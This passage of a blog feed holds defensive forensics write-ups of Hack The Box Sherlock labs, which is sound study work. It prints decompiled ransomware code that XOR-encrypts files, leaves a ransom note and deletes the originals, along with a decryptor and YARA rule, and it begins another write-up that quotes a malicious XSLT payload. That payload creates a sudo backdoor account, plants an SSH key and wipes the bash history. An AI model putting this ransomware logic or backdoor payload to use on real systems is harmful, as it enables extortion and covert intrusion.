</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> (local_20 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; uVar2 <span style="color:#ff79c6">=</span> local_20, (<span style="color:#8be9fd">long</span>)local_20 <span style="color:#ff79c6">&lt;</span> (<span style="color:#8be9fd">long</span>)local_30; local_20 <span style="color:#ff79c6">=</span> local_20 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>) {
</span></span><span style="display:flex;"><span>      bVar1 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(byte <span style="color:#ff79c6">*</span>)((<span style="color:#8be9fd">long</span>)local_38 <span style="color:#ff79c6">+</span> local_20);
</span></span><span style="display:flex;"><span>      sVar4 <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">strlen</span>(param_2);
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">*</span>(byte <span style="color:#ff79c6">*</span>)((<span style="color:#8be9fd">long</span>)local_38 <span style="color:#ff79c6">+</span> local_20) <span style="color:#ff79c6">=</span> bVar1 <span style="color:#ff79c6">^</span> param_2[uVar2 <span style="color:#ff79c6">%</span> sVar4];
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">snprintf</span>(local_448,<span style="color:#bd93f9">0x400</span>,<span style="color:#f1fa8c">&#34;%s.24bes&#34;</span>,param_1);
</span></span><span style="display:flex;"><span>    local_28 <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">fopen</span>(local_448,<span style="color:#f1fa8c">&#34;wb&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">fwrite</span>(local_38,<span style="color:#bd93f9">1</span>,local_30,local_28);
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">fclose</span>(local_28);
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">free</span>(local_38);
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">snprintf</span>(local_848,<span style="color:#bd93f9">0x400</span>,<span style="color:#f1fa8c">&#34;%s_note.txt&#34;</span>,local_448);
</span></span><span style="display:flex;"><span>    local_40 <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">fopen</span>(local_848,<span style="color:#f1fa8c">&#34;w&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (local_40 <span style="color:#ff79c6">==</span> (FILE <span style="color:#ff79c6">*</span>)<span style="color:#bd93f9">0x0</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#50fa7b">printf</span>(<span style="color:#f1fa8c">&#34;Error creating note file: %s</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>,local_848);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">else</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#50fa7b">fwrite</span>(<span style="color:#f1fa8c">&#34;This file has been encrypted by bes24 group, please contact us at bes24@protonmail.com  to discuss payment for us providing you the decryption software..</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>
</span></span><span style="display:flex;"><span>             ,<span style="color:#bd93f9">1</span>,<span style="color:#bd93f9">0x99</span>,local_40);
</span></span><span style="display:flex;"><span>      <span style="color:#50fa7b">fclose</span>(local_40);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    iVar3 <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">remove</span>(param_1);
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (iVar3 <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">0</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#50fa7b">printf</span>(<span style="color:#f1fa8c">&#34;Error deleting original file: %s</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>,param_1);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Looks like XOR encryption mechanism. I used ChatGPT to describe the function&rsquo;s source code. I got the following response.
Sure, let’s go through this C function <code>encrypt_file</code> step by step to understand how it works.</p>
<h5 id="function-purpose">Function Purpose</h5>
<p>The <code>encrypt_file</code> function reads a file, encrypts its content using a provided key, writes the encrypted content to a new file, and creates a note file indicating the file has been encrypted.</p>
<h5 id="function-parameters">Function Parameters</h5>
<ul>
<li><code>char *param_1</code>: The name (or path) of the file to be encrypted.</li>
<li><code>char *param_2</code>: The encryption key used to encrypt the file content.</li>
</ul>
<h5 id="local-variables">Local Variables</h5>
<ul>
<li><code>byte bVar1</code>: A byte variable used in the encryption process.</li>
<li><code>ulong uVar2</code>: A variable used in the encryption process for indexing.</li>
<li><code>int iVar3</code>: An integer to check the result of removing the original file.</li>
<li><code>size_t sVar4</code>: Size variable used to store the length of the encryption key.</li>
<li><code>char local_848[1024]</code>: A buffer to store the name of the note file.</li>
<li><code>char local_448[1032]</code>: A buffer to store the name of the encrypted file.</li>
<li><code>FILE *local_40</code>: File pointer for creating the note file.</li>
<li><code>void *local_38</code>: Pointer to dynamically allocated memory for reading the file content.</li>
<li><code>size_t local_30</code>: Variable to store the size of the file being read.</li>
<li><code>FILE *local_28</code>: File pointer for the file being read and the encrypted file being written.</li>
<li><code>ulong local_20</code>: Loop counter used in the encryption process.</li>
</ul>
<h5 id="step-by-step-explanation">Step-by-Step Explanation</h5>
<ol>
<li>
<p><strong>Open the Original File</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>local_28 <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">fopen</span>(param_1, <span style="color:#f1fa8c">&#34;rb&#34;</span>);
</span></span></code></pre></div><ul>
<li>Attempts to open the file specified by <code>param_1</code> in binary read mode.</li>
<li>If the file cannot be opened, it prints an error message.</li>
</ul>
</li>
<li>
<p><strong>Read the File Content</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#50fa7b">fseek</span>(local_28, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">2</span>);
</span></span><span style="display:flex;"><span>local_30 <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">ftell</span>(local_28);
</span></span><span style="display:flex;"><span><span style="color:#50fa7b">rewind</span>(local_28);
</span></span><span style="display:flex;"><span>local_38 <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">malloc</span>(local_30);
</span></span><span style="display:flex;"><span><span style="color:#50fa7b">fread</span>(local_38, <span style="color:#bd93f9">1</span>, local_30, local_28);
</span></span><span style="display:flex;"><span><span style="color:#50fa7b">fclose</span>(local_28);
</span></span></code></pre></div><ul>
<li>Seeks to the end of the file to determine its size (<code>local_30</code>).</li>
<li>Allocates memory to <code>local_38</code> to hold the file content.</li>
<li>Reads the file content into <code>local_38</code>.</li>
<li>Closes the original file.</li>
</ul>
</li>
<li>
<p><strong>Encrypt the File Content</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff79c6">for</span> (local_20 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; uVar2 <span style="color:#ff79c6">=</span> local_20, (<span style="color:#8be9fd">long</span>)local_20 <span style="color:#ff79c6">&lt;</span> (<span style="color:#8be9fd">long</span>)local_30; local_20 <span style="color:#ff79c6">=</span> local_20 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>) {
</span></span><span style="display:flex;"><span>    bVar1 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(byte <span style="color:#ff79c6">*</span>)((<span style="color:#8be9fd">long</span>)local_38 <span style="color:#ff79c6">+</span> local_20);
</span></span><span style="display:flex;"><span>    sVar4 <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">strlen</span>(param_2);
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">*</span>(byte <span style="color:#ff79c6">*</span>)((<span style="color:#8be9fd">long</span>)local_38 <span style="color:#ff79c6">+</span> local_20) <span style="color:#ff79c6">=</span> bVar1 <span style="color:#ff79c6">^</span> param_2[uVar2 <span style="color:#ff79c6">%</span> sVar4];
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><ul>
<li>Iterates through each byte of the file content.</li>
<li>Encrypts each byte by XORing it with a byte from the encryption key <code>param_2</code>. The key is used in a cyclic manner.</li>
</ul>
</li>
<li>
<p><strong>Write the Encrypted Content to a New File</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#50fa7b">snprintf</span>(local_448, <span style="color:#bd93f9">0x400</span>, <span style="color:#f1fa8c">&#34;%s.24bes&#34;</span>, param_1);
</span></span><span style="display:flex;"><span>local_28 <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">fopen</span>(local_448, <span style="color:#f1fa8c">&#34;wb&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#50fa7b">fwrite</span>(local_38, <span style="color:#bd93f9">1</span>, local_30, local_28);
</span></span><span style="display:flex;"><span><span style="color:#50fa7b">fclose</span>(local_28);
</span></span><span style="display:flex;"><span><span style="color:#50fa7b">free</span>(local_38);
</span></span></code></pre></div><ul>
<li>Constructs the name for the encrypted file by appending &ldquo;.24bes&rdquo; to the original filename.</li>
<li>Opens the new file in binary write mode.</li>
<li>Writes the encrypted content to this new file.</li>
<li>Closes the new file and frees the allocated memory.</li>
</ul>
</li>
<li>
<p><strong>Create a Note File</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#50fa7b">snprintf</span>(local_848, <span style="color:#bd93f9">0x400</span>, <span style="color:#f1fa8c">&#34;%s_note.txt&#34;</span>, local_448);
</span></span><span style="display:flex;"><span>local_40 <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">fopen</span>(local_848, <span style="color:#f1fa8c">&#34;w&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> (local_40 <span style="color:#ff79c6">==</span> (FILE <span style="color:#ff79c6">*</span>)<span style="color:#bd93f9">0x0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">printf</span>(<span style="color:#f1fa8c">&#34;Error creating note file: %s</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, local_848);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">fwrite</span>(<span style="color:#f1fa8c">&#34;This file has been encrypted by bes24 group, please contact us at bes24@protonmail.com to discuss payment for us providing you the decryption software..</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, <span style="color:#bd93f9">1</span>, <span style="color:#bd93f9">0x99</span>, local_40);
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">fclose</span>(local_40);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><ul>
<li>Constructs the name for the note file by appending &ldquo;_note.txt&rdquo; to the encrypted file name.</li>
<li>Opens the note file in write mode.</li>
<li>Writes a ransom note to the note file.</li>
<li>Closes the note file.</li>
</ul>
</li>
<li>
<p><strong>Delete the Original File</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>iVar3 <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">remove</span>(param_1);
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> (iVar3 <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">printf</span>(<span style="color:#f1fa8c">&#34;Error deleting original file: %s</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, param_1);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><ul>
<li>Attempts to delete the original file.</li>
<li>If deletion fails, it prints an error message.</li>
</ul>
</li>
</ol>
<h5 id="functions-purpose">Function&rsquo;s Purpose</h5>
<p>The <code>encrypt_file</code> function encrypts the content of a specified file using a provided key and saves the encrypted content to a new file with a &ldquo;.24bes&rdquo; extension. It also creates a note file containing a message from the &ldquo;bes24 group,&rdquo; and then attempts to delete the original file. This function mimics the behavior of ransomware.</p>
<p>Using the help of ChatGPT I created the following decryption tool in Python.
<strong>Decryptor Tool</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> sys
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">decrypt_file</span>(encrypted_file: <span style="color:#8be9fd;font-style:italic">str</span>, decryption_key: <span style="color:#8be9fd;font-style:italic">str</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">try</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># Open the encrypted file for reading in binary mode</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">with</span> <span style="color:#8be9fd;font-style:italic">open</span>(encrypted_file, <span style="color:#f1fa8c">&#39;rb&#39;</span>) <span style="color:#ff79c6">as</span> ef:
</span></span><span style="display:flex;"><span>            encrypted_data <span style="color:#ff79c6">=</span> ef<span style="color:#ff79c6">.</span>read()
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># Prepare the decryption key</span>
</span></span><span style="display:flex;"><span>        key_length <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">len</span>(decryption_key)
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># Decrypt the data</span>
</span></span><span style="display:flex;"><span>        decrypted_data <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">bytearray</span>()
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#8be9fd;font-style:italic">len</span>(encrypted_data)):
</span></span><span style="display:flex;"><span>            decrypted_byte <span style="color:#ff79c6">=</span> encrypted_data[i] <span style="color:#ff79c6">^</span> <span style="color:#8be9fd;font-style:italic">ord</span>(decryption_key[i <span style="color:#ff79c6">%</span> key_length])
</span></span><span style="display:flex;"><span>            decrypted_data<span style="color:#ff79c6">.</span>append(decrypted_byte)
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># Prepare the output file name by removing the .24bes extension</span>
</span></span><span style="display:flex;"><span>        output_file <span style="color:#ff79c6">=</span> encrypted_file<span style="color:#ff79c6">.</span>replace(<span style="color:#f1fa8c">&#39;.24bes&#39;</span>, <span style="color:#f1fa8c">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># Write the decrypted data to the output file</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">with</span> <span style="color:#8be9fd;font-style:italic">open</span>(output_file, <span style="color:#f1fa8c">&#39;wb&#39;</span>) <span style="color:#ff79c6">as</span> df:
</span></span><span style="display:flex;"><span>            df<span style="color:#ff79c6">.</span>write(decrypted_data)
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;File decrypted successfully: </span><span style="color:#f1fa8c">{</span>encrypted_file<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c"> -&gt; </span><span style="color:#f1fa8c">{</span>output_file<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">except</span> FileNotFoundError:
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;Error: The file </span><span style="color:#f1fa8c">{</span>encrypted_file<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c"> does not exist.&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">except</span> Exception <span style="color:#ff79c6">as</span> e:
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;An error occurred: </span><span style="color:#f1fa8c">{</span>e<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">decrypt_directory</span>(directory: <span style="color:#8be9fd;font-style:italic">str</span>, decryption_key: <span style="color:#8be9fd;font-style:italic">str</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># Get all files in the directory with .24bes extension</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> filename <span style="color:#ff79c6">in</span> os<span style="color:#ff79c6">.</span>listdir(directory):
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> filename<span style="color:#ff79c6">.</span>endswith(<span style="color:#f1fa8c">&#39;.24bes&#39;</span>):
</span></span><span style="display:flex;"><span>            encrypted_file_path <span style="color:#ff79c6">=</span> os<span style="color:#ff79c6">.</span>path<span style="color:#ff79c6">.</span>join(directory, filename)
</span></span><span style="display:flex;"><span>            decrypt_file(encrypted_file_path, decryption_key)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># Hardcoded decryption key</span>
</span></span><span style="display:flex;"><span>DECRYPTION_KEY <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;bhUlIshutrea98liOp&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> __name__ <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> <span style="color:#8be9fd;font-style:italic">len</span>(sys<span style="color:#ff79c6">.</span>argv) <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">2</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Usage: python decrypt_files.py &lt;directory&gt;&#34;</span>)
</span></span><span style="display:flex;"><span>        sys<span style="color:#ff79c6">.</span>exit(<span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    directory <span style="color:#ff79c6">=</span> sys<span style="color:#ff79c6">.</span>argv[<span style="color:#bd93f9">1</span>]
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">not</span> os<span style="color:#ff79c6">.</span>path<span style="color:#ff79c6">.</span>isdir(directory):
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;Error: </span><span style="color:#f1fa8c">{</span>directory<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c"> is not a valid directory.&#34;</span>)
</span></span><span style="display:flex;"><span>        sys<span style="color:#ff79c6">.</span>exit(<span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    decrypt_directory(directory, DECRYPTION_KEY)
</span></span></code></pre></div><p>Using this tool we were successful in decrypting the files of the <code>forela-criticaldata</code> directory.</p>
<h4 id="virustotal">VirusTotal</h4>
<p><img src="images/20240619191644.png" alt="virustotal score">
<a href="https://www.virustotal.com/gui/file/19ad47d6e0a43e77e1d23534404bd7bb7f0742b961ef2b219160c9ef3945572d/details">VirusTotal - Analysis</a></p>
<h4 id="yara-rule">YARA Rule</h4>
<p>This is my first yara rule. So, please forgive if it&rsquo;s not good.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>rule Bes24Ransomware
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    meta:
</span></span><span style="display:flex;"><span>        description = &#34;Detects Bes24 Ransomware&#34;
</span></span><span style="display:flex;"><span>        author = &#34;Shakil Hossain&#34;
</span></span><span style="display:flex;"><span>        date = &#34;2024-06-19&#34;
</span></span><span style="display:flex;"><span>        version = &#34;1.0&#34;
</span></span><span style="display:flex;"><span>        hash = &#34;19ad47d6e0a43e77e1d23534404bd7bb7f0742b961ef2b219160c9ef3945572d&#34;
</span></span><span style="display:flex;"><span>        score = 32
</span></span><span style="display:flex;"><span>        id = &#34;fcaf0277-67bc-512a-97ff-4e8b30190eef&#34;
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>    strings:
</span></span><span style="display:flex;"><span>        $str1 = &#34;This file has been encrypted by bes24 group, please contact us at bes24@protonmail.com to discuss payment for us providing you the decryption software..&#34;
</span></span><span style="display:flex;"><span>        $str2 = &#34;.24bes&#34;
</span></span><span style="display:flex;"><span>        $str3 = &#34;_note.txt&#34;
</span></span><span style="display:flex;"><span>        $str4 = &#34;bes24@protonmail.com&#34;
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    condition:
</span></span><span style="display:flex;"><span>        filesize &lt; 20KB
</span></span><span style="display:flex;"><span>        and
</span></span><span style="display:flex;"><span>        any of ($str*)
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>After recovering the files we accomplished our objectives. Now let&rsquo;s answer the tasks.</p>
<h4 id="task-solution">Task Solution</h4>
<ol>
<li>For task one we already have the encryption key listed above.</li>
<li>We can find the answer in the <code>forela_uk_applicants.sql</code> file.</li>
<li>We can find it in the <code>it_assets.xml</code> file.</li>
<li>We can find it in any file with the <code>.24bes_note.txt</code> extension.</li>
<li>To find this answer we can use <code>jq</code> with following query: <code>jq 'to_entries | map(.value) | max_by(.profit_percentage) | {email, profit_percentage}' trading-firebase_bkup.json</code></li>
<li>We can find this in the <code>sales_forecast.xlsx</code> file.</li>
<li>Also we can find this answer in the hard coded strings section.</li>
<li>Doing an <code>md5sum</code> on the file <code>orela_uk_applicants.sql</code> will get you the answer.</li>
<li>Doing an <code>md5sum</code> on the file <code>trading-firebase_bkup.json</code> will get you the answer.</li>
<li>Doing an <code>md5sum</code> on the file <code>complaints.csv</code> will get you the answer.</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Please calculate the hashes for the file without modifying the file. You may feel tempting to format a file for better visibility. For forensic purpose make a copy of the original file then do operation on it.
</span></span></code></pre></div><h3 id="summary">Summary</h3>
<p>This was my first malware analysis Sherlock, where I reversed a very simple ransomware. I did static analysis on the binary and found the encryption key and encryption algorithm which facilitate the creation of a decryption tool and recover the business critical files. I also created an YARA rule to detect this malware. It was fun.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://medium.com/@ajmewal/basics-of-elf-executable-and-linkable-format-file-88a516877356">Basics of ELF (Executable and Linkable Format) file by Ajmewal - Medium</a></li>
<li><a href="https://github.com/Neo23x0/yara-uuid-generator">YARA UUID Generator using Hash</a></li>
<li><a href="https://www.veeam.com/blog/yara-rules-malware-detection-analysis.html">Mastering YARA Rules: Malware Detection and Analysis - Veeam</a></li>
</ul>
]]></description></item><item><title>HTB Sherlock Fragility</title><link>https://hshakilst.github.io/posts/htb-sherlocks/fragility/</link><pubDate>Sat, 15 Jun 2024 04:15:59 -0400</pubDate><guid>https://hshakilst.github.io/posts/htb-sherlocks/fragility/</guid><description><![CDATA[<h1 id="fragility-dfir">Fragility (DFIR)</h1>
<h3 id="scenario">Scenario</h3>
<p>In the monitoring team at our company, each member has access to Splunk web UI using an admin Splunk account. Among them, John has full control over the machine that hosts the entire Splunk system. One day, he panicked and reported to us that an important file on his computer had disappeared. Moreover, he also discovered a new account on the login screen. Suspecting this to be the result of an attack, we proceeded to collect some evidence from his computer and also obtained network capture. Can you help us investigate it?</p>
<h3 id="artifacts">Artifacts</h3>
<table>
<thead>
<tr>
<th>Artifact</th>
<th>MD5 Hash</th>
<th>Password</th>
</tr>
</thead>
<tbody>
<tr>
<td>fragility.zip</td>
<td>e1d81df86e9201f99051c713620fb6c6</td>
<td>hacktheblue</td>
</tr>
<tr>
<td>capture.pcapng</td>
<td>636aa4c094866c852fdebcb1c65d5944</td>
<td>n/a</td>
</tr>
<tr>
<td>Challenge.7z</td>
<td>c1ebd1edb34e2953356b5200ecc673ac</td>
<td>n/a</td>
</tr>
</tbody>
</table>
<h3 id="tools">Tools</h3>
<ul>
<li>Wireshark - PCAP Analysis</li>
</ul>
<h3 id="forensic-analysis">Forensic Analysis</h3>
<p>After acquiring the artifacts, I analyzed the PCAP file using Wireshark and exported the HTTP Objects. I found several suspicious requests two of them stands out the most.</p>
<p>The attacker uploaded a malicious <code>XSLT</code> file to the Splunk Server.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>XSLT (eXtensible Stylesheet Language Transformations) is the recommended style sheet language for XML. XSLT is far more sophisticated than CSS. With XSLT you can add/remove elements and attributes to or from the output file.
</span></span></code></pre></div><p><img src="images/20240615092924.png" alt="alt text"></p>
<p>The file contained the following payload inside it.</p>
<p><strong>search.xsl</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#ff79c6">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;xsl:stylesheet</span> <span style="color:#50fa7b">version=</span><span style="color:#f1fa8c">&#34;1.0&#34;</span> <span style="color:#50fa7b">xmlns:xsl=</span><span style="color:#f1fa8c">&#34;http://www.w3.org/1999/XSL/Transform&#34;</span> <span style="color:#50fa7b">xmlns:exsl=</span><span style="color:#f1fa8c">&#34;http://exslt.org/common&#34;</span> <span style="color:#50fa7b">extension-element-prefixes=</span><span style="color:#f1fa8c">&#34;exsl&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;xsl:template</span> <span style="color:#50fa7b">match=</span><span style="color:#f1fa8c">&#34;/&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;exsl:document</span> <span style="color:#50fa7b">href=</span><span style="color:#f1fa8c">&#34;/opt/splunk/bin/scripts/search.sh&#34;</span> <span style="color:#50fa7b">method=</span><span style="color:#f1fa8c">&#34;text&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;xsl:text&gt;</span>#!/bin/bash&amp;#10;adduser --shell /bin/bash --gecos nginx --quiet --disabled-password --home /var/www/ nginx&amp;#10;access=$(echo MzlhNmJiZTY0NTYzLTY3MDktOTNhNC1hOWYzLTJjZTc4Mjhm | base64 -d | rev)&amp;#10;echo &amp;quot;nginx:$access&amp;quot; | chpasswd&amp;#10;usermod -aG sudo nginx&amp;#10;mkdir /var/www/.ssh&amp;#10;echo &amp;quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKoougbBG5oQuAQWW2JcHY/ZN49jmeegLqgVlimxv42SfFXcuRgUoyostBB6HnHB5lKxjrBmG/183q1AWn6HBmHpbzjZZqKwSfKgap34COp9b+E9oIgsu12lA1I7TpOw1S6AE71d4iPj5pFFxpUbSG7zJaQ2CAh1qK/0RXioZYbEGYDKVQc7ivd1TBvt0puoogWxllsCUTlJxyQXg2OcDA/8enLh+8UFKIvZy4Ylr4zNY4DyHmwVDL06hcjTfCP4T/JWHf8ShEld15gjuF1hZXOuQY4qwit/oYRN789mq2Ke+Azp0wEo/wTNHeY9OSQOn04zGQH/bLfnjJuq1KQYUUHRCE1CXjUt4cxazQHnNeVWlGOn5Dklb/CwkIcarX4cYQM36rqMusTPPvaGmIbcWiXw9J3ax/QB2DR3dF31znW4g5vHjYYrFeKmcZU1+DCUx075nJEVjy+QDTMQvRXW9Jev6OApHVLZc6Lx8nNm8c6X6s4qBSu8EcLLWYFWIwxqE= support@nginx.org&amp;quot; &amp;gt; /var/www/.ssh/authorized_keys&amp;#10;chown -R nginx:nginx /var/www/&amp;#10;cat /dev/null &amp;gt; /root/.bash_history<span style="color:#ff79c6">&lt;/xsl:text&gt;</span>
